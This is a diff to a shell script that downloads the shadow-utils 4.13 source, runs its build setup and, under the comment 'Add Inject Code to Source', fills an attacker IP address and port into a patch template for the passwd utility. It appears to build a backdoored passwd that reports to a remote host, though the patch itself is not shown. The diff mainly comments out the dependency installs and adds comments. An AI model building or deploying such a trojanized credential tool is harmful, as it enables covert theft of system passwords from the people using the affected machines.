@@ -25,13 +25,15 @@ if [[ $pass == n ]]; then
     exit 0
 fi
 
-## Get dependancies and autogen ##
-sudo apt install -y make autoconf autopoint libtool xsltproc bison byacc python3-pip
-sudo pip3 install python-dotenv
+## Get dependancies and autogen ## (DEPRECIATED FOR COMPATABILITY)
+#sudo apt install -y make autoconf autopoint libtool xsltproc bison byacc python3-pip
+#sudo pip3 install python-dotenv
 
+## Download Shado Source ###
 wget -nc https://github.com/shadow-maint/shadow/archive/refs/tags/4.13.tar.gz -O shadow.tar.gz
 tar -xf shadow.tar.gz
 
+## Run Autogen Script ##
 cd shadow-4.13
 FILE=Makefile
 if [ ! -f "$FILE" ]; then
@@ -39,7 +41,7 @@ if [ ! -f "$FILE" ]; then
 fi
 cd ../
 
-## Add Inject Code ##
+## Add Inject Code to Source ##
 cp passwdTemp.patch passwd.patch
 sed -i 's/%ip%/'"$ip"'/g' passwd.patch
 sed -i 's/%port%/'"$port"'/g' passwd.patch
